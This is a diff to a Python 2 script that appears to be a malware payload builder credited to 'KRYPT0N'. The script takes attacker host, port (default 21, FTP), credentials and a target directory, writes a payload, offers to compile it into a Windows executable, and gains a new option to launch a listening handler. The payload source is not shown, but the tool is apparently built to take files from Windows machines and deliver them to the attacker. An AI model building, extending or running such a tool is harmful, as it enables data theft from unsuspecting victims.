@@ -1,6 +1,6 @@
 import os, sys, time
 from core import colors
-
+import handler
 
 
 def source(username, password, directory, host, port):
@@ -48,7 +48,7 @@ def banner():
                                                   | |
                                                   |_|
 
-        ** By KRYPT0N ** version 1 BETA ** PROJECT0 **  
+        ** By KRYPT0N ** Off Volume 1.0 ** PROJECT0 **  
 
     """ + colors.color.ENDC
 
@@ -65,7 +65,7 @@ def opts():
         lport = "21"
     else:
         pass
-    print colors.color.YELLOW + "\nUsers settins : " + colors.color.ENDC
+    print colors.color.YELLOW + "\nUsers settings : " + colors.color.ENDC
     print "--------------- "
     username = raw_input("Username : ")
     password = raw_input("Password : ")
@@ -78,10 +78,11 @@ def opts():
     print "---------------- "
     filename = raw_input("Save as : ")
     qcompile = raw_input("Compile to windows executable [Y/n]: ")
+    qhandler = raw_input("Start handler after generating [Y/n]: ")
     print ""
-    build(lhost, lport, username, password, directory, filename, qcompile)
+    build(lhost, lport, username, password, directory, filename, qcompile, qhandler)
 
-def build(lhost, lport, username, password, directory, filename, qcompile):
+def build(lhost, lport, username, password, directory, filename, qcompile, qhandler):
     print colors.status.OK + " Editing payload source code.."
     sourcecode = source(username, password, directory, lhost, lport)
     print colors.status.OK + " Writing payload file.."
@@ -90,6 +91,12 @@ def build(lhost, lport, username, password, directory, filename, qcompile):
         compile(filename)
     else:
         pass
+    if qhandler in ("y", "Y"):
+        print colors.color.YELLOW + "\nHandler : " + colors.color.ENDC
+        print "---------"
+        rhost = raw_input("rhost : ")
+        print ""
+        handler.main(rhost, int(lport), username, password)
     print colors.status.SUCCESS + " Operation finished check the output folder."
 
 banner()
